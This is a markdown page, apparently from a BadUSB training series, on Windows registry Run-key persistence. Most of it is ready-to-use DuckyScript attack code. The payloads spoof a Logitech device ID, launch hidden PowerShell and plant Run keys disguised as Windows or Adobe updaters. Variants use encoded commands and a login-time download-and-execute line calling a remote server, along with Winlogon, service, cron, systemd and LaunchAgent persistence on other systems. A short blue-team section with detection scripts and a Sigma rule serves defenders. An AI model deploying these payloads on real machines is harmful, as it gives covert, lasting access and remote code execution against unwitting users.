# FZ-I09: Registry Persistence

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I09 |
| **Name** | Registry Persistence |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~5 seconds |
| **Persistence** | Registry Run Key |
| **MITRE ATT&CK** | T1547.001 (Registry Run Keys) |

## What This Payload Does

Adds a registry entry that executes code every time a user logs in. The Windows Registry Run keys are one of the most common persistence mechanisms used by both malware and legitimate software.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Registry Persistence
REM Target: Windows 10/11
REM Action: Adds Run key for persistence
REM Persistence: User logon
REM Skill: Intermediate
REM WARNING: Modifies system registry
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Add registry Run key
STRINGLN $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
STRINGLN $name = "WindowsSecurityHealth"
STRINGLN $value = "powershell.exe -w hidden -ep bypass -c `"'$(Get-Date)' >> $env:TEMP\persist.txt`""
STRINGLN Set-ItemProperty -Path $path -Name $name -Value $value -Type String
STRINGLN exit
```

---

## Registry Run Key Locations

### User-Level (No Admin Required)

| Location | Scope |
|----------|-------|
| `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` | Current user login |
| `HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce` | Once, then deleted |

### System-Level (Admin Required)

| Location | Scope |
|----------|-------|
| `HKLM:\Software\Microsoft\Windows\CurrentVersion\Run` | All user logins |
| `HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce` | Once, then deleted |
| `HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices` | Before login (legacy) |

### 32-bit on 64-bit Windows

| Location |
|----------|
| `HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run` |
| `HKCU:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run` |

---

## Payload Variations

### Version 1: PowerShell Encoded Command

```ducky
STRINGLN $cmd = "Write-Output 'Executed' | Out-File $env:TEMP\run.txt -Append"
STRINGLN $bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
STRINGLN $encoded = [Convert]::ToBase64String($bytes)
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdate" -Value "powershell.exe -w hidden -ep bypass -enc $encoded"
```

### Version 2: Executable Download on Login

```ducky
STRINGLN $payload = "powershell.exe -w hidden -ep bypass -c `"IEX(New-Object Net.WebClient).DownloadString('https://server/payload.ps1')`""
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AdobeUpdate" -Value $payload
```

### Version 3: RunOnce (Self-Deleting)

```ducky
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "TempTask" -Value "cmd /c echo OneTime > $env:TEMP\once.txt"
```

### Version 4: Silent VBS Launcher

```ducky
REM Create VBS wrapper for silent execution
STRINGLN $vbs = 'CreateObject("Wscript.Shell").Run "powershell -ep bypass -file C:\Users\Public\script.ps1", 0'
STRINGLN $vbs | Out-File "C:\Users\Public\launcher.vbs"
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "wscript.exe C:\Users\Public\launcher.vbs"
```

---

## Other Registry Persistence Locations

### Startup Folder (Alternative)

```powershell
# User startup folder
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
"powershell -w hidden -c 'echo test'" | Out-File "$startup\update.bat"

# All users startup folder (admin required)
$allUsers = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

### Service Registration

```powershell
# Create malicious service (admin required)
New-Service -Name "WinSecHealth" -BinaryPathName "C:\path\to\malware.exe" -StartupType Automatic
```

### Winlogon Keys

```powershell
# Userinit (admin required)
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$current = (Get-ItemProperty $path).Userinit
Set-ItemProperty $path -Name "Userinit" -Value "$current,C:\path\to\payload.exe"
```

---

## Cross-Platform Persistence

### macOS (Launch Agent)

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN mkdir -p ~/Library/LaunchAgents
STRINGLN cat << 'EOF' > ~/Library/LaunchAgents/com.user.update.plist
STRINGLN <?xml version="1.0" encoding="UTF-8"?>
STRINGLN <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
STRINGLN <plist version="1.0">
STRINGLN <dict>
STRINGLN     <key>Label</key><string>com.user.update</string>
STRINGLN     <key>ProgramArguments</key>
STRINGLN     <array><string>/bin/bash</string><string>-c</string><string>echo "$(date)" >> /tmp/persist.txt</string></array>
STRINGLN     <key>RunAtLoad</key><true/>
STRINGLN </dict>
STRINGLN </plist>
STRINGLN EOF
STRINGLN launchctl load ~/Library/LaunchAgents/com.user.update.plist
```

### Linux (Various Methods)

**Bashrc/Profile:**
```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
STRINGLN echo 'echo "$(date)" >> /tmp/persist.txt' >> ~/.bashrc
```

**Cron:**
```ducky
STRINGLN (crontab -l 2>/dev/null; echo "@reboot /path/to/script.sh") | crontab -
```

**Systemd User Service:**
```ducky
STRINGLN mkdir -p ~/.config/systemd/user
STRINGLN echo '[Service]
STRINGLN ExecStart=/bin/bash -c "echo run >> /tmp/p.txt"
STRINGLN [Install]
STRINGLN WantedBy=default.target' > ~/.config/systemd/user/persist.service
STRINGLN systemctl --user enable persist.service
```

### Android (Limited)

Android doesn't have user-accessible autostart registry. Options include:
- Tasker app automation
- Boot broadcast receiver (requires app development)
- Init.d scripts (root required)

### iOS

iOS does not allow user-configurable autostart mechanisms.

---

## Red Team Perspective

### Blending In

Choose registry names that look legitimate:

| Good Names | Mimics |
|------------|--------|
| WindowsSecurityHealth | Windows Defender |
| AdobeUpdater | Adobe software |
| GoogleUpdate | Chrome/Google |
| OneDriveSync | Microsoft OneDrive |
| JavaUpdate | Oracle Java |
| iTunesHelper | Apple iTunes |

### Evasion Techniques

1. **Indirect Execution**: Use scheduled task that reads from registry
2. **Living off the Land**: Use legitimate binaries (mshta, wscript)
3. **Encoded Payloads**: Base64 encoded PowerShell
4. **File-based**: Registry points to file, file is payload

### Attack Chain

```
Initial Access → Registry Persistence → System Restart → Maintained Access
                        ↑
                    You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Registry Modifications**
   - Sysmon Event ID 13 (Registry value set)
   - Event ID 4657 (Registry modification)

2. **Run Key Monitoring**
   - Changes to Run/RunOnce keys
   - New entries with PowerShell or script interpreters

3. **Process Creation**
   - Processes spawned from Run keys at logon
   - PowerShell with suspicious arguments

### Detection Script

```powershell
# Check for suspicious Run key entries
$runKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($key in $runKeys) {
    Get-ItemProperty $key -ErrorAction SilentlyContinue |
    ForEach-Object {
        $_.PSObject.Properties | Where-Object {
            $_.Value -match 'powershell|cmd|wscript|cscript|mshta|hidden|bypass|encoded'
        } | ForEach-Object {
            [PSCustomObject]@{
                Key = $key
                Name = $_.Name
                Value = $_.Value
            }
        }
    }
}
```

### Sigma Rule

```yaml
title: Suspicious Registry Run Key Modification
status: experimental
description: Detects suspicious entries added to registry Run keys
logsource:
    product: windows
    category: registry_set
detection:
    selection_path:
        TargetObject|contains:
            - '\CurrentVersion\Run'
            - '\CurrentVersion\RunOnce'
    selection_value:
        Details|contains:
            - 'powershell'
            - '-hidden'
            - '-ep bypass'
            - '-encodedcommand'
            - 'wscript'
            - 'cscript'
            - 'mshta'
    condition: selection_path and selection_value
level: high
tags:
    - attack.persistence
    - attack.t1547.001
```

### Prevention

1. **Group Policy**
   - Disable script execution from Run keys
   - Restrict registry write access

2. **Monitoring**
   - Alert on Run key modifications
   - Baseline legitimate entries

3. **Application Control**
   - Whitelist allowed autostart programs
   - Block script interpreters at startup

---

## Cleanup

### Remove Persistence

```powershell
# Remove specific entry
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth"

# List all entries first
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

---

## Practice Exercises

### Exercise 1: List Run Keys
View all current Run key entries:
```ducky
STRINGLN Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-List
```

### Exercise 2: Create Harmless Entry
Add an entry that opens Notepad:
```ducky
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestEntry" -Value "notepad.exe"
```

### Exercise 3: RunOnce Test
Create self-deleting entry:
```ducky
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "OneTimeTest" -Value "msg * Test"
```

---

## Payload File

Save as `FZ-I09_Registry_Persistence.txt`:

```ducky
REM FZ-I09: Registry Persistence
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinSecHealth" -Value "powershell.exe -w hidden -c `"'$(Get-Date)'>>$env:TEMP\p.txt`"";exit
```

---

[← FZ-I08 Clipboard Capture](FZ-I08_Clipboard_Capture.md) | [Back to Intermediate](README.md) | [Next: FZ-I10 macOS Keychain Query →](FZ-I10_macOS_Keychain.md)
